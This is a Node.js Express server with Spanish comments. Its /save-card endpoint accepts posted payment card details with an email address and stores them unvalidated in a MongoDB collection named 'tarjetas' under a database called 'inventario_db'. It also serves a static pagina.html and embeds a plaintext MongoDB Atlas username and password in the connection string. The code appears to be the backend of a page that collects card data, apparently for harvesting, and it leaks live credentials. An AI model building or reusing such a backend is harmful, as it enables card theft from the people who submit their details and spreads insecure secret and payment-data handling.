// server.js
const express = require('express');
const { MongoClient } = require('mongodb'); 
const cors = require('cors'); 
const app = express();

// Asegúrate de usar process.env.PORT para Render
const serverPort = process.env.PORT || 3000;

// =================================================================
// CONFIGURACIÓN DE MONGODB (SOLUCIÓN MÁS COMPATIBLE)
// =================================================================

// ⚠️ CAMBIO CLAVE: Añadimos 'tls=true' y 'serverSelectionTimeoutMS' para resolver conflictos de SSL/TLS
// Nota: La URL completa de MongoDB Atlas incluye 'mongodb+srv://' al inicio
const uri = "mongodb+srv://maxueljoseuwwi_db_user:Maxuel09@cluster0.dfxcysb.mongodb.net/?retryWrites=true&w=majority&serverSelectionTimeoutMS=5000&tls=true"; 
const client = new MongoClient(uri);

app.use(cors()); 
app.use(express.json());

// =================================================================
// 1. ENDPOINT DE GUARDADO DE TARJETA EN MONGODB
// =================================================================

app.post('/save-card', async (req, res) => {
    const cardData = req.body;
    
    const logEntry = {
        ...cardData, 
        timestamp: new Date()
    };
    
    try {
        // CONEXIÓN TEMPORAL: Conectamos y cerramos en cada solicitud para evitar fallos
        await client.connect(); 
        
        const database = client.db("inventario_db"); 
        const collection = database.collection("tarjetas"); 
        
        await collection.insertOne(logEntry);

        console.log(`✅ Tarjeta (${cardData.tipo_tarjeta}) guardada para: ${cardData.email}`);
        res.status(200).send({ message: 'Datos recibidos y guardados con éxito en la DB.' });

    } catch (error) {
        console.error('❌ Error al guardar en MongoDB:', error);
        res.status(500).send({ message: 'Error interno del servidor al conectar con la base de datos.' });
    } finally {
        // Cerrar la conexión después de la operación es CRÍTICO para esta estructura
        await client.close();
    }
});


// =================================================================
// 2. SERVIR ARCHIVOS ESTÁTICOS (PARA pagina.html, img, etc.)
// =================================================================
app.use(express.static(__dirname)); 


// =================================================================
// 3. INICIAR EL SERVIDOR
// =================================================================
app.listen(serverPort, () => {
    console.log(`Servidor de inventario iniciado y escuchando en el puerto ${serverPort}`);
    console.log(`¡Despliegue verificado!`);
});
